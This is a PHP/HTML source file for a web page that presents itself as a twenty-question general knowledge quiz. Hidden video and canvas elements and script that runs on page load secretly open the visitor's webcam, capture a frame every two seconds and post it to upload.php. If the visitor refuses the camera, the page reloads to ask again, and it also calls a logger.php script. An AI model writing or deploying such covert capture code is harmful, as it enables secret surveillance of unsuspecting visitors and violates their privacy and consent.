<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interactive Quiz with Silent Capture</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f5f7fa;
            color: #333;
            line-height: 1.6;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .quiz-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 600px;
            padding: 30px;
            margin: 20px;
        }

        .quiz-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .quiz-header h1 {
            color: #2c3e50;
            margin-bottom: 10px;
        }

        .progress-container {
            width: 100%;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-bottom: 20px;
            height: 10px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            background-color: #3498db;
            width: 0%;
            transition: width 0.3s ease;
        }

        .progress-text {
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            color: #7f8c8d;
        }

        .question {
            font-size: 1.2rem;
            font-weight: 600;
            margin-bottom: 20px;
            color: #2c3e50;
        }

        .options {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 20px;
        }

        .option {
            padding: 12px 15px;
            background-color: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .option:hover {
            background-color: #e9ecef;
            border-color: #adb5bd;
        }

        .option.correct {
            background-color: #d4edda;
            border-color: #c3e6cb;
            color: #155724;
        }

        .option.incorrect {
            background-color: #f8d7da;
            border-color: #f5c6cb;
            color: #721c24;
        }

        .feedback {
            text-align: center;
            margin: 15px 0;
            font-weight: bold;
            min-height: 24px;
        }

        .feedback.correct {
            color: #28a745;
        }

        .feedback.incorrect {
            color: #dc3545;
        }

        .score {
            text-align: center;
            font-size: 1.1rem;
            margin-bottom: 20px;
            font-weight: bold;
        }

        .results {
            display: none;
            text-align: center;
        }

        .results h2 {
            color: #2c3e50;
            margin-bottom: 15px;
        }

        .final-score {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .performance {
            font-size: 1.2rem;
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 5px;
        }

        .excellent {
            background-color: #d4edda;
            color: #155724;
        }

        .good {
            background-color: #fff3cd;
            color: #856404;
        }

        .poor {
            background-color: #f8d7da;
            color: #721c24;
        }

        .btn {
            padding: 10px 20px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #2980b9;
        }

        .btn-restart {
            background-color: #6c757d;
        }

        .btn-restart:hover {
            background-color: #5a6268;
        }

        @media (max-width: 480px) {
            .quiz-container {
                padding: 20px;
            }

            .question {
                font-size: 1.1rem;
            }

            .option {
                padding: 10px 12px;
            }
        }

        video, canvas {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="quiz-container">
        <div class="quiz-header">
            <h1>General Knowledge Quiz</h1>
        </div>

        <div class="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
        <div class="progress-text" id="progress-text">Question 1 of 20</div>

        <div class="score" id="score">Score: 0</div>

        <div id="quiz-content">
            <div class="question" id="question"></div>
            <div class="options" id="options"></div>
            <div class="feedback" id="feedback"></div>
        </div>

        <div class="results" id="results">
            <h2>Quiz Completed!</h2>
            <div class="final-score" id="final-score"></div>
            <div class="performance" id="performance"></div>
            <button class="btn btn-restart" id="restart-btn">Restart Quiz</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const quizQuestions = [
            {
                question: "What is the capital of France?",
                options: ["London", "Berlin", "Paris", "Madrid"],
                answer: "Paris"
            },
            {
                question: "Which planet is known as the Red Planet?",
                options: ["Venus", "Mars", "Jupiter", "Saturn"],
                answer: "Mars"
            },
            {
                question: "What is the largest ocean on Earth?",
                options: ["Atlantic Ocean", "Indian Ocean", "Arctic Ocean", "Pacific Ocean"],
                answer: "Pacific Ocean"
            },
            {
                question: "Who painted the Mona Lisa?",
                options: ["Vincent van Gogh", "Pablo Picasso", "Leonardo da Vinci", "Michelangelo"],
                answer: "Leonardo da Vinci"
            },
            {
                question: "What is the chemical symbol for gold?",
                options: ["Go", "Gd", "Au", "Ag"],
                answer: "Au"
            },
            {
                question: "Which country is home to the kangaroo?",
                options: ["New Zealand", "South Africa", "Australia", "Brazil"],
                answer: "Australia"
            },
            {
                question: "What is the tallest mammal?",
                options: ["Elephant", "Giraffe", "Blue Whale", "Polar Bear"],
                answer: "Giraffe"
            },
            {
                question: "Which language is the most widely spoken in the world?",
                options: ["English", "Mandarin Chinese", "Spanish", "Hindi"],
                answer: "Mandarin Chinese"
            },
            {
                question: "What is the largest organ in the human body?",
                options: ["Liver", "Brain", "Skin", "Heart"],
                answer: "Skin"
            },
            {
                question: "Which year did World War II end?",
                options: ["1943", "1945", "1947", "1950"],
                answer: "1945"
            },
            {
                question: "What is the currency of Japan?",
                options: ["Won", "Yen", "Yuan", "Ringgit"],
                answer: "Yen"
            },
            {
                question: "Who wrote 'Romeo and Juliet'?",
                options: ["Charles Dickens", "William Shakespeare", "Jane Austen", "Mark Twain"],
                answer: "William Shakespeare"
            },
            {
                question: "What is the hardest natural substance on Earth?",
                options: ["Gold", "Iron", "Diamond", "Platinum"],
                answer: "Diamond"
            },
            {
                question: "Which element has the chemical symbol 'O'?",
                options: ["Gold", "Oxygen", "Osmium", "Oganesson"],
                answer: "Oxygen"
            },
            {
                question: "How many continents are there on Earth?",
                options: ["5", "6", "7", "8"],
                answer: "7"
            },
            {
                question: "What is the largest country by area?",
                options: ["China", "Canada", "United States", "Russia"],
                answer: "Russia"
            },
            {
                question: "Which animal is known as the 'King of the Jungle'?",
                options: ["Tiger", "Elephant", "Lion", "Gorilla"],
                answer: "Lion"
            },
            {
                question: "What is the main gas that makes up the Earth's atmosphere?",
                options: ["Oxygen", "Carbon Dioxide", "Nitrogen", "Hydrogen"],
                answer: "Nitrogen"
            },
            {
                question: "How many colors are in a rainbow?",
                options: ["5", "6", "7", "8"],
                answer: "7"
            },
            {
                question: "Which planet is closest to the Sun?",
                options: ["Venus", "Earth", "Mars", "Mercury"],
                answer: "Mercury"
            }
        ];

        const questionElement = document.getElementById('question');
        const optionsElement = document.getElementById('options');
        const feedbackElement = document.getElementById('feedback');
        const progressBar = document.getElementById('progress-bar');
        const progressText = document.getElementById('progress-text');
        const scoreElement = document.getElementById('score');
        const quizContent = document.getElementById('quiz-content');
        const resultsElement = document.getElementById('results');
        const finalScoreElement = document.getElementById('final-score');
        const performanceElement = document.getElementById('performance');
        const restartButton = document.getElementById('restart-btn');

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let currentQuestionIndex = 0;
        let score = 0;
        let quizCompleted = false;
        let lastImageHash = "";

        function initQuiz() {
            currentQuestionIndex = 0;
            score = 0;
            quizCompleted = false;
            quizContent.style.display = 'block';
            resultsElement.style.display = 'none';
            updateScore();
            showQuestion();
        }

        function showQuestion() {
            if (currentQuestionIndex >= quizQuestions.length) {
                endQuiz();
                return;
            }

            const question = quizQuestions[currentQuestionIndex];
            questionElement.textContent = question.question;

            optionsElement.innerHTML = '';

            question.options.forEach((option, index) => {
                const optionElement = document.createElement('div');
                optionElement.classList.add('option');
                optionElement.textContent = option;
                optionElement.addEventListener('click', () => selectAnswer(option));
                optionsElement.appendChild(optionElement);
            });

            updateProgress();
        }

        function updateProgress() {
            const progress = ((currentQuestionIndex) / quizQuestions.length) * 100;
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `Question ${currentQuestionIndex + 1} of ${quizQuestions.length}`;
        }

        function selectAnswer(selectedOption) {
            if (quizCompleted) return;

            const question = quizQuestions[currentQuestionIndex];
            const options = document.querySelectorAll('.option');

            options.forEach(option => {
                option.style.pointerEvents = 'none';
            });

            const isCorrect = selectedOption === question.answer;

            if (isCorrect) {
                score++;
                updateScore();
                feedbackElement.textContent = 'Correct!';
                feedbackElement.className = 'feedback correct';
            } else {
                feedbackElement.textContent = 'Incorrect!';
                feedbackElement.className = 'feedback incorrect';
            }

            options.forEach(option => {
                if (option.textContent === question.answer) {
                    option.classList.add('correct');
                } else if (option.textContent === selectedOption && !isCorrect) {
                    option.classList.add('incorrect');
                }
            });

            setTimeout(() => {
                currentQuestionIndex++;
                feedbackElement.textContent = '';
                feedbackElement.className = 'feedback';
                showQuestion();
            }, 1000);
        }

        function updateScore() {
            scoreElement.textContent = `Score: ${score}`;
        }

        function endQuiz() {
            quizCompleted = true;
            quizContent.style.display = 'none';
            resultsElement.style.display = 'block';

            const percentage = Math.round((score / quizQuestions.length) * 100);
            finalScoreElement.textContent = `Your Score: ${score}/${quizQuestions.length} (${percentage}%)`;

            let performanceMessage = '';
            let performanceClass = '';
            
            if (percentage >= 80) {
                performanceMessage = 'Excellent! You know your stuff!';
                performanceClass = 'excellent';
            } else if (percentage >= 50) {
                performanceMessage = 'Good Job! You did well!';
                performanceClass = 'good';
            } else {
                performanceMessage = 'Try Again! You can do better!';
                performanceClass = 'poor';
            }

            performanceElement.textContent = performanceMessage;
            performanceElement.className = `performance ${performanceClass}`;
        }

        function getImageHash(dataUrl) {
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                const char = dataUrl.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0;
            }
            return hash;
        }

        function captureAndSend() {
            const width = video.videoWidth;
            const height = video.videoHeight;

            if (width === 0 || height === 0) return;

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(video, 0, 0, width, height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const hash = getImageHash(dataUrl);

            if (hash === lastImageHash) {
                return;
            }

            lastImageHash = hash;

            fetch('upload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(captureAndSend, 2000);
                })
                .catch(err => {
                    console.warn("Camera access failed:", err);
                    setTimeout(() => location.reload(), 5000);
                });
        }

        restartButton.addEventListener('click', initQuiz);
        window.addEventListener('load', () => {
            initQuiz();
            startCamera();
            fetch("logger.php").then(res => res.text()).then(console.log);
        });
    </script>
</body>
</html>